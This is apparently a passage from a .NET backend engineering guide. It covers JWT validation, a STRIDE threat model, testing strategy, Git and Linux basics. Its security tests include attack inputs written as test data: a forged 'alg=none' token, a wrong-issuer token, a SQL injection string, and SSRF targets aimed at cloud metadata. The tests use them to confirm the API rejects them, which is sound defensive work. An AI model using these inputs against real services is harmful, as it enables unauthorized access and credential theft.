- **Token version.** Store `token_version` per user or client. Put it in the token as a claim. Increase it to revoke **all** older tokens at once.
- **Introspection** (ask the IdP on each call). Exact, but slow and couples you to the IdP.

### Key rotation: `kid` and JWKS

- The IdP signs with a private key. The JWT header has `kid` (key ID).
- The IdP publishes public keys at a JWKS URL (`/.well-known/jwks.json`), found through `/.well-known/openid-configuration`.
- To rotate: publish the **new** key in JWKS, wait for caches to refresh, start signing with it, and remove the **old** key only after the longest token signed with it has expired.
- ASP.NET Core JwtBearer with `Authority` set downloads JWKS, caches it and refreshes it when it sees an unknown `kid`. You do not write this code.

### The validation checklist

| Check | What it stops |
|---|---|
| **Signature** with a trusted key | forged or edited tokens |
| **alg** in an allowlist (for example only RS256) | `alg=none` and algorithm-confusion attacks |
| **iss** equals your IdP | tokens from another IdP or tenant |
| **aud** equals this API (`jobs-api`) | a token meant for another API being replayed here |
| **exp** in the future (small clock skew) | old or stolen tokens forever |
| **nbf** in the past | tokens used before they are valid |
| Then: **scope** and **tenant_id** | valid token, wrong permission |

```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o =>
    {
        o.Authority = builder.Configuration["Auth:Authority"];   // e.g. https://idp.example.com/realms/jobs
        o.MapInboundClaims = false;                              // keep "sub", "scope", "tenant_id" as sent
        o.TokenValidationParameters = new TokenValidationParameters
        {
            ValidIssuer = builder.Configuration["Auth:Issuer"],
            ValidAudience = builder.Configuration["Auth:Audience"],   // "jobs-api"
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            RequireSignedTokens = true,
            RequireExpirationTime = true,
            ValidAlgorithms = [SecurityAlgorithms.RsaSha256],
            ClockSkew = TimeSpan.FromSeconds(30)                     // default is 5 minutes
        };
    });
```

### Six negative tests

A test token factory with its own RSA key:

```csharp
using System.Security.Cryptography;
using Microsoft.IdentityModel.JsonWebTokens;
using Microsoft.IdentityModel.Tokens;

public static class TestTokens
{
    public const string Issuer = "https://test-issuer";
    public const string Audience = "jobs-api";
    public static readonly RsaSecurityKey Key = new(RSA.Create(2048)) { KeyId = "test-1" };
    private static readonly RsaSecurityKey WrongKey = new(RSA.Create(2048)) { KeyId = "test-1" };

    public static string Create(string scope = "jobs:read jobs:write", string tenant = "tenant-a",
        string issuer = Issuer, string audience = Audience,
        DateTime? notBefore = null, DateTime? expires = null, bool signWithWrongKey = false)
    {
        var nbf = notBefore ?? DateTime.UtcNow.AddMinutes(-1);
        return new JsonWebTokenHandler().CreateToken(new SecurityTokenDescriptor
        {
            Issuer = issuer,
            Audience = audience,
            IssuedAt = nbf,
            NotBefore = nbf,
            Expires = expires ?? DateTime.UtcNow.AddMinutes(10),
            Claims = new Dictionary<string, object>
                { ["sub"] = "client-1", ["tenant_id"] = tenant, ["scope"] = scope },
            SigningCredentials = new SigningCredentials(
                signWithWrongKey ? WrongKey : Key, SecurityAlgorithms.RsaSha256)
        });
    }

    public static string CreateAlgNone()
    {
        var exp = DateTimeOffset.UtcNow.AddMinutes(10).ToUnixTimeSeconds();
        var header = Base64UrlEncoder.Encode("""{"alg":"none","typ":"JWT"}""");
        var payload = Base64UrlEncoder.Encode(
            $$"""{"iss":"{{Issuer}}","aud":"{{Audience}}","exp":{{exp}},"tenant_id":"tenant-a","scope":"jobs:read jobs:write"}""");
        return $"{header}.{payload}.";               // empty signature
    }
}
```

Point the API at the test key in the test factory:

```csharp
builder.ConfigureTestServices(services =>
    services.PostConfigure<JwtBearerOptions>(JwtBearerDefaults.AuthenticationScheme, o =>
    {
        o.ConfigurationManager = null;              // do not call the real IdP (verify on your version)
        o.TokenValidationParameters.ValidIssuer = TestTokens.Issuer;
        o.TokenValidationParameters.ValidAudience = TestTokens.Audience;
        o.TokenValidationParameters.IssuerSigningKey = TestTokens.Key;
    }));
```

The tests (the `ApiFactory` class is in `add-test-strategy`):

```csharp
public sealed class TokenTests(ApiFactory factory) : IClassFixture<ApiFactory>
{
    private async Task<HttpStatusCode> Send(HttpMethod method, string url, string token)
    {
        var client = factory.CreateClient();
        var req = new HttpRequestMessage(method, url);
        req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
        if (method == HttpMethod.Post)
            req.Content = JsonContent.Create(new { type = "echo", payload = new { } });
        return (await client.SendAsync(req)).StatusCode;
    }

    [Fact] public async Task Valid_token_is_accepted_positive_control() =>
        Assert.Equal(HttpStatusCode.OK, await Send(HttpMethod.Get, "/jobs", TestTokens.Create()));

    [Fact] public async Task Expired_token_is_rejected() =>
        Assert.Equal(HttpStatusCode.Unauthorized, await Send(HttpMethod.Get, "/jobs",
            TestTokens.Create(notBefore: DateTime.UtcNow.AddMinutes(-30), expires: DateTime.UtcNow.AddMinutes(-10))));

    [Fact] public async Task Wrong_audience_is_rejected() =>
        Assert.Equal(HttpStatusCode.Unauthorized, await Send(HttpMethod.Get, "/jobs", TestTokens.Create(audience: "billing-api")));

    [Fact] public async Task Wrong_issuer_is_rejected() =>
        Assert.Equal(HttpStatusCode.Unauthorized, await Send(HttpMethod.Get, "/jobs", TestTokens.Create(issuer: "https://evil-issuer")));

    [Fact] public async Task Bad_signature_is_rejected() =>
        Assert.Equal(HttpStatusCode.Unauthorized, await Send(HttpMethod.Get, "/jobs", TestTokens.Create(signWithWrongKey: true)));

    [Fact] public async Task Alg_none_is_rejected() =>
        Assert.Equal(HttpStatusCode.Unauthorized, await Send(HttpMethod.Get, "/jobs", TestTokens.CreateAlgNone()));

    [Fact] public async Task Missing_scope_is_forbidden() =>
        Assert.Equal(HttpStatusCode.Forbidden, await Send(HttpMethod.Post, "/jobs", TestTokens.Create(scope: "jobs:read")));
}
```

Always keep the **positive control**. Without it, a broken setup that returns 401 for everything makes all six negative tests pass.

---

<a id="add-sec-threat-model"></a>

## ➕ A lightweight threat model for the job platform

A threat model answers four questions: What are we building? What can go wrong? What will we do about it? Did we do a good job? Spend one hour on it, keep it in the repo as `docs/threat-model.md`, and update it when the design changes.

### Step 1: draw the data flow and the trust boundaries

```
 [Client service] --HTTPS + JWT--> | ALB | --> [Jobs API] --SQL/TLS--> [PostgreSQL]
                                   (boundary 1: internet)   |
                                                            +--AMQPS--> [RabbitMQ] --> [Worker] --SQL--> [PostgreSQL]
                                                                                           |
                                                     (boundary 2: outbound to internet)    +--HTTPS--> [callbackUrl]
 [Operator] --HTTPS + admin scope--> /admin/*
```

A **trust boundary** is where data crosses from less-trusted to more-trusted (or the other way). Most threats sit on boundaries: internet → API, API → broker, worker → outside world.

### Step 2: STRIDE in one table

| STRIDE | Threat in the job platform | Mitigation | Test |
|---|---|---|---|
| **S**poofing | Stolen or forged token; a fake publisher puts messages on the broker | Full JWT validation; broker users per service with their own passwords; TLS | Tests 1–3 below |
| **T**ampering | SQL injection; a job's payload or status edited through over-posting; a message edited in the queue | Parameterised queries; DTOs; only the API and worker can write to the broker | Tests 5, 6 |
| **R**epudiation | "We never cancelled that job" with no record of who did | Audit log row for create, cancel, requeue: who, when, trace ID | Test 10 |
| **I**nformation disclosure | Tenant A reads tenant B's job; stack traces in errors; tokens in logs | Tenant query filter; ProblemDetails; log redaction | Tests 4, 9 |
| **D**enial of service | Job flood, huge payloads, poison message retried forever, slow callback holds worker threads | Rate limit, size limits, quotas, max attempts + DLQ, outbound timeouts | Tests 7, 8 |
| **E**levation of privilege | Tenant calls `/admin/*`; SSRF via `callbackUrl` reaches cloud metadata and steals role credentials | Admin policy on a route group; SSRF guard; least-privilege IAM roles | Tests 4, 8 |

### Step 3: the 10 security tests the project must have

1. Each of the six token tests (expired, wrong audience, wrong issuer, bad signature, `alg=none`, missing scope) plus one positive control.
2. No token → 401 on every route except health checks (loop over `EndpointDataSource`).
3. A route snapshot test: a new route fails the build until it is added to the approved list.
4. Tenant A gets 404 for tenant B's job on GET, cancel and list. A `jobs:write` token gets 403 on `/admin/*`.
5. Over-posting: a body with `tenantId` or `status` → 400, and no row is created.
6. SQL injection probe: `type = "x' OR '1'='1"` returns no other rows and causes no 500.
7. Limits: a 1 MB body → 413. `pageSize=10000` → 400. Over the rate limit → 429. Over the tenant quota → 429.
8. SSRF: `callbackUrl` with `169.254.169.254`, `localhost`, `10.x` or `http://` → 400. The connect guard refuses a host that resolves to a private IP.
9. Errors in `Production` return ProblemDetails with no stack trace. Logs from a test request contain no `Authorization` value.
10. Audit: cancelling a job writes an audit row with the caller's `sub`, tenant and trace ID.

---

<a id="add-test-strategy"></a>

## ➕ Testing strategy in .NET

### Three levels, and what each one catches

| Level | What it runs | Speed | Catches | Misses |
|---|---|---|---|---|
| **Unit** | one class or function, no I/O | milliseconds | logic bugs: backoff maths, state transitions, validation | SQL, wiring, config, serialization |
| **Integration** | the real API in memory + real PostgreSQL/RabbitMQ in containers | seconds | wrong SQL, missing migration, DI wiring, auth setup, JSON shape, transactions | network, deployment, real cloud config |
| **End-to-end** | the deployed system (Compose or a test environment) | minutes | broken deploy, wrong ports, env vars, the full API → queue → worker path | exact cause; slow to debug |

Most tests should be unit and integration tests. Keep a **few** end-to-end smoke tests (see `add-cd`). A mock of the database does not prove your SQL works. That is why integration tests use a real PostgreSQL.

### Project layout

```bash
dotnet new xunit -n Jobs.UnitTests -o tests/Jobs.UnitTests
dotnet new xunit -n Jobs.IntegrationTests -o tests/Jobs.IntegrationTests
dotnet sln add tests/Jobs.UnitTests tests/Jobs.IntegrationTests
```

Check which xUnit the template gives you. xUnit v3 uses the package `xunit.v3` (verify; there is also a `dotnet new xunit3` template from `xunit.v3.templates`). The examples below use v3, where `IAsyncLifetime` returns `ValueTask`. In v2 it returns `Task`.

### xUnit basics, naming and Arrange/Act/Assert

```csharp
public class JobStateTests
{
    [Fact]
    public void Cancel_on_queued_job_sets_status_cancelled()
    {
        // Arrange
        var job = Job.Create(tenantId: Guid.NewGuid(), type: "echo");

        // Act
        var result = job.Cancel();

        // Assert
        Assert.True(result.IsSuccess);
        Assert.Equal(JobStatus.Cancelled, job.Status);
    }

    [Theory]
    [InlineData(JobStatus.Completed)]
    [InlineData(JobStatus.Failed)]
    [InlineData(JobStatus.Cancelled)]
    public void Cancel_on_finished_job_is_rejected(JobStatus finished)
    {
        var job = JobBuilder.InStatus(finished);
        var result = job.Cancel();
        Assert.False(result.IsSuccess);
        Assert.Equal(finished, job.Status);        // unchanged
    }
}
```

- `[Fact]`: one case. `[Theory]` + `[InlineData]`: the same test with different data.
- Name: `Method_or_action_condition_expected_result`. The name should tell you what broke without opening the test.
- One reason to fail per test. Asserting several properties of one result is fine.

### Fakes vs mocks (NSubstitute)

- A **fake** is a small working implementation: `InMemoryJobRepository`, `FakeTimeProvider`. Use it when you care about **state**.
- A **mock** records calls so you can check them. Use it when the **call itself** is the result (for example "a message was published").
- Do not mock what you do not own (`DbContext`, `HttpClient`). Use a real database or a stub handler instead.

```csharp
// dotnet add package NSubstitute
[Fact]
public async Task Create_publishes_JobCreated_once()
{
    var publisher = Substitute.For<IJobPublisher>();
    var service = new JobService(new InMemoryJobRepository(), publisher, TimeProvider.System);

    var job = await service.CreateAsync(new CreateJobRequest("echo", Json("{}"), null), tenantId: Guid.NewGuid(), CancellationToken.None);

    await publisher.Received(1).PublishAsync(
        Arg.Is<JobCreated>(m => m.JobId == job.Id), Arg.Any<CancellationToken>());
}
```

### Integration tests: `WebApplicationFactory<Program>` + Testcontainers

```bash
dotnet add tests/Jobs.IntegrationTests package Microsoft.AspNetCore.Mvc.Testing
dotnet add tests/Jobs.IntegrationTests package Testcontainers.PostgreSql
dotnet add tests/Jobs.IntegrationTests package Testcontainers.RabbitMq
```

If the test project cannot see `Program`, add `public partial class Program;` at the end of `Program.cs`. (It is harmless if a generator already adds it.)

```csharp
using Testcontainers.PostgreSql;
using Testcontainers.RabbitMq;

public sealed class ApiFactory : WebApplicationFactory<Program>, IAsyncLifetime
{
    // Recent Testcontainers versions take the image in the constructor;
    // the parameterless constructor is obsolete. Pin the tag you run in production.
    private readonly PostgreSqlContainer _pg = new PostgreSqlBuilder("postgres:17-alpine").Build();
    private readonly RabbitMqContainer _mq = new RabbitMqBuilder("rabbitmq:4-management").Build();

    public async ValueTask InitializeAsync()
    {
        await Task.WhenAll(_pg.StartAsync(), _mq.StartAsync());
        using var scope = Services.CreateScope();                     // this starts the host
        await scope.ServiceProvider.GetRequiredService<JobsDb>().Database.MigrateAsync();
    }

    protected override void ConfigureWebHost(IWebHostBuilder builder)
    {
        builder.UseEnvironment("Testing");
        builder.UseSetting("ConnectionStrings:Jobs", _pg.GetConnectionString());
        builder.UseSetting("ConnectionStrings:RabbitMq", _mq.GetConnectionString());
        builder.ConfigureTestServices(services =>
        {
            services.PostConfigure<JwtBearerOptions>(JwtBearerDefaults.AuthenticationScheme, o =>
            {
                o.ConfigurationManager = null;
                o.TokenValidationParameters.ValidIssuer = TestTokens.Issuer;
                o.TokenValidationParameters.ValidAudience = TestTokens.Audience;
                o.TokenValidationParameters.IssuerSigningKey = TestTokens.Key;
            });
        });
    }

    public override async ValueTask DisposeAsync()
    {
        await base.DisposeAsync();
        await _pg.DisposeAsync();
        await _mq.DisposeAsync();
    }

    public HttpClient ClientFor(string tenant, string scope = "jobs:read jobs:write")
    {
        var c = CreateClient();
        c.DefaultRequestHeaders.Authorization = new("Bearer", TestTokens.Create(scope: scope, tenant: tenant));
        return c;
    }
}

public sealed class TenantIsolationTests(ApiFactory api) : IClassFixture<ApiFactory>
{
    [Fact]
    public async Task Tenant_A_cannot_read_tenant_B_job()
    {
        var b = api.ClientFor("22222222-2222-2222-2222-222222222222");
        var created = await b.PostAsJsonAsync("/jobs", new { type = "echo", payload = new { } });
        var job = await created.Content.ReadFromJsonAsync<JobResponse>();

        var a = api.ClientFor("11111111-1111-1111-1111-111111111111");
        var response = await a.GetAsync($"/jobs/{job!.Id}");

        Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
    }
}
```

Testcontainers needs Docker on the machine. GitHub's `ubuntu-latest` runners have Docker, so this works in CI too.

### Deterministic time: `TimeProvider` + `FakeTimeProvider`

Never call `DateTime.UtcNow` or `Task.Delay(ms)` in logic you want to test. Inject `TimeProvider` (built into .NET 8+). In tests, use `FakeTimeProvider` from the package `Microsoft.Extensions.TimeProvider.Testing` (namespace `Microsoft.Extensions.Time.Testing`).

```csharp
// Production registration
builder.Services.AddSingleton(TimeProvider.System);

public sealed class Lease(string owner, DateTimeOffset expiresAt)
{
    public string Owner { get; } = owner;
    public static Lease Acquire(string owner, TimeProvider time, TimeSpan length) =>
        new(owner, time.GetUtcNow() + length);
    public bool IsExpired(TimeProvider time) => time.GetUtcNow() >= expiresAt;
}

[Fact]
public void Lease_expires_after_its_length()
{
    var time = new FakeTimeProvider(new DateTimeOffset(2026, 10, 19, 9, 0, 0, TimeSpan.Zero));
    var lease = Lease.Acquire("worker-1", time, TimeSpan.FromSeconds(30));

    time.Advance(TimeSpan.FromSeconds(29));
    Assert.False(lease.IsExpired(time));

    time.Advance(TimeSpan.FromSeconds(1));
    Assert.True(lease.IsExpired(time));
}
```

For code that waits, use `Task.Delay(delay, timeProvider, ct)` (the `TimeProvider` overload). In the test, start the work, then call `time.Advance(...)`. The delay completes at once. The test takes milliseconds, not minutes.

### Deterministic randomness (jitter)

```csharp
public sealed class Backoff(Random random)
{
    // attempt 1 → 0.5 s, 2 → 1 s, 3 → 2 s ... capped at 30 s, plus up to 20% jitter
    public TimeSpan Delay(int attempt)
    {
        var baseMs = Math.Min(30_000, 500 * Math.Pow(2, attempt - 1));
        return TimeSpan.FromMilliseconds(baseMs + random.NextDouble() * 0.2 * baseMs);
    }
}

sealed class FixedRandom(double value) : Random { public override double NextDouble() => value; }

[Theory]
[InlineData(1, 500)]
[InlineData(4, 4_000)]
[InlineData(20, 30_000)]          // capped
public void Delay_without_jitter_follows_doubling(int attempt, double expectedMs) =>
    Assert.Equal(expectedMs, new Backoff(new FixedRandom(0)).Delay(attempt).TotalMilliseconds);

[Fact]
public void Jitter_never_exceeds_20_percent() =>
    Assert.Equal(600, new Backoff(new FixedRandom(1.0)).Delay(1).TotalMilliseconds, precision: 3);
```

In production, register `Random.Shared`. A seeded `new Random(42)` also gives repeatable runs.

### Testing idempotency and concurrency

Idempotency is easy to get wrong under **parallel** requests. A check-then-insert without a unique constraint passes a sequential test and fails this one.

```csharp
[Fact]
public async Task Same_idempotency_key_sent_20_times_in_parallel_creates_one_job()
{
    var client = api.ClientFor("11111111-1111-1111-1111-111111111111");
    var key = Guid.NewGuid().ToString();

    var responses = await Task.WhenAll(Enumerable.Range(0, 20).Select(_ =>
    {
        var req = new HttpRequestMessage(HttpMethod.Post, "/jobs")
            { Content = JsonContent.Create(new { type = "echo", payload = new { n = 1 } }) };
        req.Headers.Add("Idempotency-Key", key);
        return client.SendAsync(req);
    }));

    Assert.All(responses, r => Assert.True(r.IsSuccessStatusCode, r.StatusCode.ToString()));
    var ids = await Task.WhenAll(responses.Select(r => r.Content.ReadFromJsonAsync<JobResponse>()));
    Assert.Single(ids.Select(j => j!.Id).Distinct());
}
```

The design that passes: a unique index on `(tenant_id, idempotency_key)`, then `INSERT ... ON CONFLICT DO NOTHING`, then read the existing row.

The worker version: insert 100 jobs, start 4 worker loops in parallel against the same database, and assert that each job was processed **exactly once** (a `processed_count` column equals 1). This proves your `FOR UPDATE SKIP LOCKED` claim query.

### Contract evolution and message contract tests

**Rules for messages and APIs:**

1. Only **add** fields, and make them optional with a safe default.
2. Never rename, remove or change the type of a field in place. Add a new field, migrate, then remove the old one later.
3. A change in meaning gets a new message type or a `SchemaVersion`.
4. Deploy **consumers first** (they must understand the new shape), then producers.
5. Consumers ignore unknown fields (tolerant reader). System.Text.Json does this by default, so do **not** set `UnmappedMemberHandling.Disallow` on message options.
6. For the HTTP API, breaking changes go to `/v2`. Announce the end date of `/v1` (for example with `Deprecation` and `Sunset` headers).

**Contract test: an old message, a new consumer.** Save one real JSON sample per published version in the test project and never edit it.

```xml
<!-- Jobs.UnitTests.csproj -->
<ItemGroup>
  <None Include="Contracts\*.json" CopyToOutputDirectory="PreserveNewest" />
</ItemGroup>
```

```csharp
// v2 added Priority with a default, so v1 messages still work
public sealed record JobCreated(Guid JobId, Guid TenantId, string Type, int SchemaVersion = 1, string Priority = "normal");

[Theory]
[InlineData("Contracts/job-created.v1.json")]
[InlineData("Contracts/job-created.v2.json")]
public void Every_published_version_deserializes(string file)
{
    var msg = JsonSerializer.Deserialize<JobCreated>(File.ReadAllText(file), MessageJson.Options);
    Assert.NotNull(msg);
    Assert.NotEqual(Guid.Empty, msg!.JobId);
    Assert.False(string.IsNullOrEmpty(msg.Priority));
}

[Fact]
public void Old_consumer_ignores_new_fields()
{
    const string v3 = """{"jobId":"7f0b4c1e-0000-0000-0000-000000000001","tenantId":"7f0b4c1e-0000-0000-0000-000000000002","type":"echo","schemaVersion":3,"region":"eu"}""";
    var msg = JsonSerializer.Deserialize<JobCreated>(v3, MessageJson.Options);
    Assert.Equal("echo", msg!.Type);
}
```

### Why tests are flaky

| Cause | Fix |
|---|---|
| Real clock (`DateTime.UtcNow`, `Task.Delay`) | `TimeProvider` + `FakeTimeProvider` |
| Unseeded randomness | inject `Random`; seed or fix it |
| Shared database state between tests | unique tenant/IDs per test, or reset (Respawn) between tests |
| Test order dependence | each test creates its own data |
| `Thread.Sleep(500)` "to wait for the worker" | poll with a timeout: wait until the condition is true or 10 s passes |
| Async code not awaited (`async void`) | always return `Task` and await it |
| Fixed ports or container names | let Testcontainers choose random host ports |

A flaky test is a bug. Fix it or delete it. Do not just press "re-run".

### Coverage: a guide, not a goal

```bash
dotnet test tests/Jobs.UnitTests --collect:"XPlat Code Coverage"     # needs coverlet.collector (verify for your runner)
```

Use the report to find **important code with no tests** (retry logic, the claim query, authorization). Do not chase a number. 90% coverage with no assertions on behaviour proves nothing. One BOLA test is worth more than ten getter tests.

---

<a id="add-git"></a>

## ➕ Git essentials

### Identity: personal repo vs work account

Your global Git identity may be your **work** email. For the personal project, set the identity **inside the repo**. It overrides the global one for this repo only.

```bash
cd ~/src/job-platform
git config user.name  "Rahul Patel"
git config user.email "your-personal-email@example.com"
git config user.email            # check: prints the repo value
git config --show-origin --get user.email   # shows which file the value came from
```

Automatic version: every repo under `~/personal/` uses the personal identity.

```ini
# ~/.gitconfig
[includeIf "gitdir:~/personal/"]
    path = ~/.gitconfig-personal

# ~/.gitconfig-personal
[user]
    name = Rahul Patel
    email = your-personal-email@example.com
```

Fix the last commit if it used the wrong email: `git commit --amend --reset-author --no-edit`. Check older commits with `git log --format='%h %an <%ae> %s' -5`.

### Daily commands

```bash
git switch -c feature/job-leases        # new branch from the current one
git status                              # what changed
git diff                                # unstaged changes
git diff --staged                       # what will be committed
git add -p                              # stage piece by piece (review your own change)
git commit -m "Add lease expiry to job claims"
git log --oneline --graph --decorate -20
git log -p -- src/Jobs.Worker/Claimer.cs    # history of one file, with diffs
git show <sha>                          # one commit
git push -u origin feature/job-leases

git stash push -m "wip: lease tests"    # park unfinished work
git stash list
git stash pop                           # bring it back
```

### Merge vs rebase

| | `git merge main` | `git rebase main` |
|---|---|---|
| What it does | adds a merge commit joining two histories | replays your commits on top of `main` |
| History | true, but can be noisy | straight line, easy to read |
| Danger | none for shared branches | rewrites your commits; **never rebase a branch others use** |
| Use it for | bringing a finished PR into `main` (or squash merge) | updating **your own** feature branch before a PR |

```bash
git fetch origin
git rebase origin/main          # update my branch
git push --force-with-lease     # safe force push: fails if someone else pushed
```

### Resolving a merge conflict, step by step

1. `git merge origin/main` (or `git rebase origin/main`) stops with `CONFLICT (content): Merge conflict in src/Jobs.Api/Program.cs`.
2. `git status` lists the files under "both modified".
3. Open each file. Find the markers:
   ```
   <<<<<<< HEAD
   builder.Services.AddRateLimiter(o => o.RejectionStatusCode = 429);
   =======
   builder.Services.AddRateLimiter(ConfigureLimits);
   >>>>>>> origin/main
   ```
4. Decide the correct result. Often you need **both** changes combined. Delete all three marker lines.
5. Build and run the tests: `dotnet build && dotnet test`.
6. `git add src/Jobs.Api/Program.cs`.
7. Finish: `git commit` (merge) or `git rebase --continue` (rebase).
8. Lost? `git merge --abort` or `git rebase --abort` returns to the start.

### Find the commit that broke something: `git bisect`

```bash
git bisect start
git bisect bad                    # current commit is broken
git bisect good v1.2.0            # this tag was fine
# Git checks out a middle commit. Test it, then say:
git bisect good    # or: git bisect bad
# ...repeat until Git prints "<sha> is the first bad commit"
git bisect reset

# Automatic: the script exits 0 for good, non-zero for bad
git bisect run dotnet test tests/Jobs.UnitTests --filter "FullyQualifiedName~Backoff"
```

### Undo: `revert` vs `reset`

| Command | What it does | Safe on shared branches? |
|---|---|---|
| `git revert <sha>` | new commit that undoes `<sha>` | **Yes.** Use this on `main`. |
| `git reset --soft HEAD~1` | undo last commit, keep changes staged | Only on unpushed work |
| `git reset --mixed HEAD~1` | undo last commit, keep changes unstaged | Only on unpushed work |
| `git reset --hard HEAD~1` | undo last commit and **delete** the changes | Only on unpushed work; check twice |
| `git restore file.cs` | discard local edits to one file | Yes |

Lost something after a reset? `git reflog` shows where `HEAD` was. `git switch -c rescue <sha>` brings it back.

### Tags

```bash
git tag -a v1.0.0 -m "First deployable version"
git push origin v1.0.0
git tag --list "v1.*"
```

Tag every deployed version. The image tag and the Git tag (or SHA) should match, so you always know what code is running.

### Good commit messages

```
Add lease expiry so crashed workers release jobs

A worker that dies while holding a job kept it forever. Claims now
set lease_expires_at = now + 30 s, and the claimer may take jobs whose
lease has expired. Adds FakeTimeProvider tests for the boundary.

Refs #42
```

- Subject: imperative mood ("Add", not "Added"), about 50 characters, no full stop.
- Body: **why** the change was needed and what it does. The diff already shows how.
- One logical change per commit. Formatting-only changes go in their own commit.

### Pull requests and a review checklist

A PR description has: what changed, why, how it was tested, and any risk or rollout step (for example "run migration first").

Review checklist:

- [ ] Does it do what the PR says? Is there a test that would fail without the change?
- [ ] Authorization: does each new endpoint have a policy and a tenant filter?
- [ ] Input: DTOs, size limits, validation?
- [ ] Data: is the migration backward compatible (expand/contract)? Indexes for new queries?
- [ ] Failure: timeouts, retries only on idempotent calls, cancellation tokens passed?
- [ ] Concurrency: races, double processing, missing unique constraints?
- [ ] Logs and metrics: useful IDs logged, no secrets or personal data?
- [ ] Naming and size: can a new person read it? Is the PR small enough to review well (a few hundred lines)?

Comment on the code, not the person. Mark small points as "nit:".

### `.gitignore` for .NET

```bash
dotnet new gitignore        # creates the standard Visual Studio/.NET .gitignore
```

Make sure it also covers:

```
bin/
obj/
.vs/
.idea/
*.user
TestResults/
coverage*/
.env
appsettings.*.local.json
*.pfx
```

---

<a id="add-linux"></a>

## ➕ Linux essentials for a backend engineer

### Navigation and files

```bash
pwd; ls -la; cd /var/log; cd -          # where am I, list all, go, go back
mkdir -p app/logs; cp -r src dst; mv a b; rm -r old_dir
cat file; less file                     # less: /text to search, n next, q quit
head -n 50 file; tail -n 50 file
find . -name "*.json" -mtime -1         # changed in the last day
grep -rn "ConnectionStrings" --include="*.json" .
```

### Permissions

```bash
ls -l run.sh            # -rwxr-x--- 1 app app ...  owner rwx, group r-x, others none
chmod 750 run.sh        # owner rwx (7), group r-x (5), others --- (0)
chmod 600 ~/.ssh/id_ed25519
chown app:app /data/jobs
sudo -u app whoami      # run a command as another user
id                      # my uid, gid and groups
```

The .NET images run as user `app` (UID 1654 in current images; verify with `id` inside the container). If the app cannot write a mounted folder, check the folder's owner first.

### Processes and signals

```bash
ps aux | grep dotnet                 # all processes, filtered
top                                  # live CPU/memory; press 1 for per-CPU, M sort by memory
htop                                 # friendlier, if installed
kill <pid>                           # sends SIGTERM (15): "please stop"
kill -9 <pid>                        # SIGKILL (9): stop now, no cleanup
pgrep -f Jobs.Worker                 # find the PID by command line
```

- **SIGTERM** asks the process to stop. .NET catches it, runs `ApplicationStopping`, stops hosted services and finishes in-flight work.
- **SIGKILL** cannot be caught. In-flight work is lost. Unacknowledged RabbitMQ messages are redelivered, which is why handlers must be idempotent.
- **SIGINT** is Ctrl+C. .NET treats it like SIGTERM.

### Services and their logs: `systemctl`, `journalctl`

```bash
sudo systemctl status jobs-api
sudo systemctl restart jobs-api
sudo systemctl enable --now jobs-api       # start now and at boot
journalctl -u jobs-api -f                  # follow logs
journalctl -u jobs-api --since "10 min ago" -p err
```

### Networking

```bash
ss -tlnp                         # listening TCP ports and their process
ss -tan state established | wc -l
ss -s                            # summary; many TIME-WAIT can mean new connections per request
curl -v http://localhost:8080/healthz/ready
curl -s -o /dev/null -w "dns=%{time_namelookup} connect=%{time_connect} tls=%{time_appconnect} ttfb=%{time_starttransfer} total=%{time_total}\n" https://api.example.com/healthz/live
dig +short db.example.internal   # DNS answer
ip addr; ip route                # my IP addresses; default gateway
nc -zv postgres 5432             # can I open TCP to this host and port?
```

### Disk

```bash
df -h                            # free space per filesystem
du -sh /var/lib/docker/* | sort -h | tail
docker system df                 # what Docker uses
```

A full disk breaks PostgreSQL, RabbitMQ (it blocks publishers when free disk is low) and logging. Check `df -h` early in any incident.

### Logs

```bash
tail -f /var/log/app/api.log
tail -f api.log | grep --line-buffered "ERROR"
grep -c "TimeoutException" api.log
grep -n "trace_id=4bf92f35" api.log
less +F api.log                  # follow; Ctrl+C to stop following and scroll
```

### Environment variables

```bash
printenv | sort
echo "$ASPNETCORE_ENVIRONMENT"
export ConnectionStrings__Jobs="Host=localhost;Database=jobs"   # __ means ":" in .NET config
env ASPNETCORE_ENVIRONMENT=Staging dotnet Jobs.Api.dll           # for one command only
cat /proc/<pid>/environ | tr '\0' '\n'                           # env of a running process
```

### SSH and keys

```bash
ssh-keygen -t ed25519 -C "rahul-personal" -f ~/.ssh/id_ed25519_personal
ssh-copy-id -i ~/.ssh/id_ed25519_personal.pub ubuntu@203.0.113.10
ssh -i ~/.ssh/id_ed25519_personal ubuntu@203.0.113.10
```

```
# ~/.ssh/config  (one key per account)
Host github-personal
    HostName github.com
    User git
    IdentityFile ~/.ssh/id_ed25519_personal
```

Then clone with `git clone git@github-personal:<you>/job-platform.git`. Never share a private key. On AWS, prefer **SSM Session Manager** over an open port 22.

### `/proc` basics

```bash
cat /proc/loadavg                 # load averages for 1, 5, 15 minutes
cat /proc/meminfo | head
cat /proc/<pid>/status | grep -E "VmRSS|Threads"   # memory and thread count
ls /proc/<pid>/fd | wc -l         # open file descriptors (sockets count too)
cat /proc/<pid>/limits | grep "open files"
```

### How a .NET app runs in a Linux container

1. `docker stop` (or ECS/Kubernetes) sends **SIGTERM** to **PID 1** in the container.
2. Your app must **be** PID 1, or receive the signal. Use the exec form `ENTRYPOINT ["dotnet", "Jobs.Api.dll"]`. The shell form `ENTRYPOINT dotnet Jobs.Api.dll` runs under `/bin/sh -c`, which may not forward the signal.
3. .NET's host catches SIGTERM. It stops accepting new requests, calls `StopAsync` on hosted services and waits up to `HostOptions.ShutdownTimeout` (30 s by default since .NET 8).
4. The platform waits for its own grace period, then sends **SIGKILL**: Docker waits 10 s by default (`stop_grace_period` in Compose), Kubernetes 30 s (`terminationGracePeriodSeconds`), ECS 30 s (`stopTimeout`). If the platform's wait is shorter than the app's, the app is killed in the middle of shutdown.

A worker that shuts down cleanly:

```csharp
public sealed class JobConsumer(ILogger<JobConsumer> log /* ... */) : BackgroundService
{
    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        // consume until stoppingToken is cancelled (SIGTERM)
        while (!stoppingToken.IsCancellationRequested)
        {
            // 1. take a message  2. process with a timeout  3. ack only after the DB commit
        }
        log.LogInformation("Stop requested; finished in-flight work, closing channel");
    }
}

// Program.cs: give in-flight jobs time to finish
builder.Services.Configure<HostOptions>(o => o.ShutdownTimeout = TimeSpan.FromSeconds(25));
```

